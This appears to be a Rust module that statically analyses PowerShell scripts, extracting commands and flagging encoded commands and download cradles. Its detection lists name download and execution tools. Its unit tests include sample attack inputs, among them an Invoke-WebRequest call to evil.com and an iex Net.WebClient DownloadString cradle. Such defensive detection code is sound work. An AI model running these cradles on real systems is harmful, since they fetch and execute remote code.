//! PowerShell script static analysis
//!
//! See `.spec/` for the full specification.

#![forbid(unsafe_code)]
#![warn(missing_docs)]

use std::mem;

/// A normalized PowerShell command extracted from source.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PowerShellCommand {
    /// Command, cmdlet, alias, method, or executable name.
    pub name: String,
    /// Positional arguments and non-parameter tokens.
    pub arguments: Vec<String>,
    /// Cmdlet-style parameters as `(name, value)` pairs.
    pub parameters: Vec<(String, String)>,
    /// Zero-based position within its pipeline.
    pub pipeline_position: usize,
}

/// Output from lightweight PowerShell normalization.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct NormalizeResult {
    /// Commands extracted in source order.
    pub commands: Vec<PowerShellCommand>,
    /// Base64-like payloads supplied to `-EncodedCommand`, `-Enc`, or `-e`.
    pub encoded_commands: Vec<String>,
    /// Download-related command or object patterns found in the script.
    pub download_patterns: Vec<String>,
}
/// Normalizes PowerShell source into security-relevant command facts.
///
/// This is intentionally a tokenizer-level normalizer, not a full PowerShell
/// AST. It preserves enough structure to identify pipelines, cmdlet parameters,
/// encoded commands, common download cradles, and dynamic execution aliases.
#[must_use]
pub fn normalize(source: &str) -> NormalizeResult {
    let tokens = tokenize(source);
    let mut normalizer = Normalizer::default();
    normalizer.consume(&tokens)
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Token {
    kind: TokenKind,
    text: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum TokenKind {
    Word,
    String,
    Pipeline,
    CommandTerminator,
}

#[derive(Default)]
struct Normalizer {
    commands: Vec<PowerShellCommand>,
    encoded_commands: Vec<String>,
    download_patterns: Vec<String>,
    pipeline_position: usize,
}

impl Normalizer {
    fn consume(&mut self, tokens: &[Token]) -> NormalizeResult {
        let mut current = Vec::new();
        for token in tokens {
            match token.kind {
                TokenKind::Pipeline => {
                    self.flush_command(&mut current);
                    self.pipeline_position = self.pipeline_position.saturating_add(1);
                }
                TokenKind::CommandTerminator => {
                    self.flush_command(&mut current);
                    self.pipeline_position = 0;
                }
                TokenKind::Word | TokenKind::String => current.push(token.clone()),
            }
        }
        self.flush_command(&mut current);

        NormalizeResult {
            commands: mem::take(&mut self.commands),
            encoded_commands: mem::take(&mut self.encoded_commands),
            download_patterns: mem::take(&mut self.download_patterns),
        }
    }
    fn flush_command(&mut self, tokens: &mut Vec<Token>) {
        if tokens.is_empty() {
            return;
        }

        let command_tokens = mem::take(tokens);
        let Some(name_token) = command_tokens.first() else {
            return;
        };
        let name = normalize_token_text(&name_token.text);
        if name.is_empty() {
            return;
        }

        let mut arguments = Vec::new();
        let mut parameters = Vec::new();
        let mut index = 1;
        while index < command_tokens.len() {
            let token = normalize_token_text(&command_tokens[index].text);
            if is_parameter_name(&token) {
                let parameter = token.trim_start_matches('-').to_owned();
                let value = command_tokens
                    .get(index.saturating_add(1))
                    .map(|candidate| normalize_token_text(&candidate.text))
                    .filter(|candidate| !is_parameter_name(candidate))
                    .unwrap_or_default();
                if !value.is_empty() {
                    index = index.saturating_add(1);
                }
                self.record_parameter(&parameter, &value);
                parameters.push((parameter, value));
            } else {
                self.record_download_pattern(&token);
                arguments.push(token);
            }
            index = index.saturating_add(1);
        }

        self.record_command_pattern(&name);
        self.commands.push(PowerShellCommand {
            name,
            arguments,
            parameters,
            pipeline_position: self.pipeline_position,
        });
    }

    fn record_parameter(&mut self, name: &str, value: &str) {
        let lowered = name.to_ascii_lowercase();
        if matches!(lowered.as_str(), "encodedcommand" | "enc" | "e") && looks_like_base64(value) {
            push_unique(&mut self.encoded_commands, value.to_owned());
        }
        self.record_download_pattern(value);
    }
    fn record_command_pattern(&mut self, name: &str) {
        let lowered = name.to_ascii_lowercase();
        let pattern = match lowered.as_str() {
            "invoke-webrequest" | "iwr" | "wget" | "curl" => Some("Invoke-WebRequest"),
            "invoke-restmethod" | "irm" => Some("Invoke-RestMethod"),
            "start-bitstransfer" => Some("Start-BitsTransfer"),
            "invoke-expression" | "iex" => Some("Invoke-Expression"),
            _ => None,
        };
        if let Some(pattern) = pattern {
            push_unique(&mut self.download_patterns, pattern.to_owned());
        }
        self.record_download_pattern(name);
    }

    fn record_download_pattern(&mut self, value: &str) {
        let lowered = value.to_ascii_lowercase();
        let pattern = if lowered.contains("net.webclient") {
            Some("Net.WebClient")
        } else if lowered.contains("invoke-webrequest") {
            Some("Invoke-WebRequest")
        } else if lowered.contains("invoke-restmethod") {
            Some("Invoke-RestMethod")
        } else if lowered.contains("start-bitstransfer") {
            Some("Start-BitsTransfer")
        } else {
            None
        };
        if let Some(pattern) = pattern {
            push_unique(&mut self.download_patterns, pattern.to_owned());
        }
    }
}

fn push_unique(values: &mut Vec<String>, value: String) {
    if !values.iter().any(|existing| existing == &value) {
        values.push(value);
    }
}

fn is_parameter_name(value: &str) -> bool {
    value.starts_with('-')
        && value.len() > 1
        && !value[1..]
            .chars()
            .all(|character| character.is_ascii_digit())
}
fn normalize_token_text(value: &str) -> String {
    let Some(first) = value.chars().next() else {
        return String::new();
    };
    if matches!(first, '\'' | '"') && value.ends_with(first) && value.len() >= 2 {
        return value[1..value.len().saturating_sub(1)].to_owned();
    }
    value.to_owned()
}

fn looks_like_base64(value: &str) -> bool {
    let candidate = value.trim();
    if candidate.len() < 8 || !candidate.len().is_multiple_of(4) {
        return false;
    }
    candidate
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'='))
}

fn tokenize(source: &str) -> Vec<Token> {
    let mut lexer = Lexer::new(source);
    lexer.tokenize();
    lexer.tokens
}

struct Lexer<'source> {
    chars: std::iter::Peekable<std::str::CharIndices<'source>>,
    tokens: Vec<Token>,
    current: String,
}

impl<'source> Lexer<'source> {
    fn new(source: &'source str) -> Self {
        Self {
            chars: source.char_indices().peekable(),
            tokens: Vec::new(),
            current: String::new(),
        }
    }
    fn tokenize(&mut self) {
        while let Some((_, character)) = self.chars.next() {
            match character {
                '\'' | '"' => self.push_quoted(character),
                '|' => self.push_delimiter(TokenKind::Pipeline, "|"),
                ';' | '\n' | '\r' => self.push_delimiter(TokenKind::CommandTerminator, ""),
                '#' => self.skip_comment(),
                '`' => self.push_escaped(),
                character if character.is_whitespace() => self.flush_word(),
                _ => self.current.push(character),
            }
        }
        self.flush_word();
    }

    fn push_quoted(&mut self, quote: char) {
        self.flush_word();
        let mut text = String::new();
        text.push(quote);
        while let Some((_, character)) = self.chars.next() {
            text.push(character);
            if character == '`' {
                if let Some((_, escaped)) = self.chars.next() {
                    text.push(escaped);
                }
                continue;
            }
            if character == quote {
                break;
            }
        }
        self.tokens.push(Token {
            kind: TokenKind::String,
            text,
        });
    }

    fn push_delimiter(&mut self, kind: TokenKind, text: &str) {
        self.flush_word();
        self.tokens.push(Token {
            kind,
            text: text.to_owned(),
        });
    }
    fn push_escaped(&mut self) {
        if let Some((_, escaped)) = self.chars.next() {
            self.current.push(escaped);
        }
    }

    fn skip_comment(&mut self) {
        self.flush_word();
        while let Some((_, character)) = self.chars.peek().copied() {
            if matches!(character, '\n' | '\r') {
                break;
            }
            self.chars.next();
        }
    }

    fn flush_word(&mut self) {
        if self.current.is_empty() {
            return;
        }
        self.tokens.push(Token {
            kind: TokenKind::Word,
            text: mem::take(&mut self.current),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::normalize;

    #[test]
    fn extracts_simple_command() {
        let result = normalize("Get-Content file.txt");

        assert_eq!(result.commands.len(), 1);
        assert_eq!(result.commands[0].name, "Get-Content");
        assert_eq!(result.commands[0].arguments, ["file.txt"]);
        assert!(result.commands[0].parameters.is_empty());
    }

    #[test]
    fn detects_invoke_webrequest_download() {
        let result = normalize("Invoke-WebRequest -Uri http://evil.com");

        assert_eq!(result.commands[0].name, "Invoke-WebRequest");
        assert_eq!(
            result.commands[0].parameters,
            [("Uri".to_owned(), "http://evil.com".to_owned())]
        );
        assert_eq!(result.download_patterns, ["Invoke-WebRequest"]);
    }
    #[test]
    fn detects_encoded_command_parameter() {
        let result = normalize("powershell.exe -EncodedCommand SQBFAFgAIAAoAA==");

        assert_eq!(result.commands[0].name, "powershell.exe");
        assert_eq!(result.encoded_commands, ["SQBFAFgAIAAoAA=="]);
    }

    #[test]
    fn extracts_pipeline_commands() {
        let result = normalize("Get-Process | Stop-Process");

        assert_eq!(result.commands.len(), 2);
        assert_eq!(result.commands[0].name, "Get-Process");
        assert_eq!(result.commands[0].pipeline_position, 0);
        assert_eq!(result.commands[1].name, "Stop-Process");
        assert_eq!(result.commands[1].pipeline_position, 1);
    }

    #[test]
    fn preserves_double_quoted_interpolation() {
        let result = normalize("Write-Output \"Hello $name\"");

        assert_eq!(result.commands[0].name, "Write-Output");
        assert_eq!(result.commands[0].arguments, ["Hello $name"]);
    }

    #[test]
    fn detects_webclient_and_alias_patterns() {
        let result = normalize("iex (New-Object Net.WebClient).DownloadString('http://evil')");

        assert_eq!(result.commands[0].name, "iex");
        assert!(
            result
                .download_patterns
                .contains(&"Invoke-Expression".to_owned())
        );
        assert!(
            result
                .download_patterns
                .contains(&"Net.WebClient".to_owned())
        );
    }
}
